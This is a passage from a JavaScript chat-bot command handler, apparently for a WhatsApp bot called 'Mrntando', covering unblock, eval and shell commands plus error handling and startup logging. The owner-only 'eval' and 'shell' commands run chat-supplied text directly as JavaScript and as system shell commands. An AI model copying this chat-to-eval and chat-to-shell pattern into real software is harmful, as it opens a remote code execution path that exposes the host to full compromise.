                    reply('✅ *USER UNBLOCKED*\n\n🔓 Successfully unblocked: ' + unblockTarget.split('@')[0] + '\n💬 They can now message the bot again.\n\n🐞 *Mrntando Security System*');
                } catch (error) {
                    reply('❌ *UNBLOCK FAILED*\n\n🔄 Could not unblock user\n📝 Error: ' + error.message);
                }
                break;
            }

            case 'eval':
            case 'exec': {
                if (!isOwner) return reply('🚫 Owner only command!');
                if (!text) return reply('❌ Please provide code to execute');
                
                try {
                    let result = eval(text);
                    if (typeof result !== 'string') result = require('util').inspect(result);
                    reply('✅ *CODE EXECUTION RESULT:*\n\n```' + result + '```');
                } catch (error) {
                    reply('❌ *EXECUTION ERROR:*\n\n```' + error.message + '```');
                }
                break;
            }

            case 'shell':
            case 'cmd': {
                if (!isOwner) return reply('🚫 Owner only command!');
                if (!text) return reply('❌ Please provide a command to execute');
                
                try {
                    const { stdout, stderr } = await execAsync(text);
                    const result = stdout || stderr || 'Command executed successfully';
                    reply('💻 *SHELL COMMAND RESULT:*\n\n```' + result + '```');
                } catch (error) {
                    reply('❌ *SHELL ERROR:*\n\n```' + error.message + '```');
                }
                break;
            }

            default: {
                // No response for unknown commands to avoid spam
                break;
            }
        }

    } catch (error) {
        console.error(chalk.red('Error in Mrntando command handler:'), error);
        reply('❌ *SYSTEM ERROR*\n\n🚫 An error occurred while processing your command.\n🔄 Please try again later.\n\n📝 Error: ' + error.message + '\n\n🐞 *Mrntando Bot Error Handler*');
    }
};

// Auto-initialize protection on module load
setTimeout(() => {
    console.log(chalk.cyan('🛡️ Mrntando Bot Protection System Loading...'));
    console.log(chalk.green('✅ Bot protection will auto-activate when first message is received'));
    console.log(chalk.yellow('⚠️  Make sure to update BOT_NUMBER and OWNER_NUMBERS at the top of the file!'));
}, 1000);
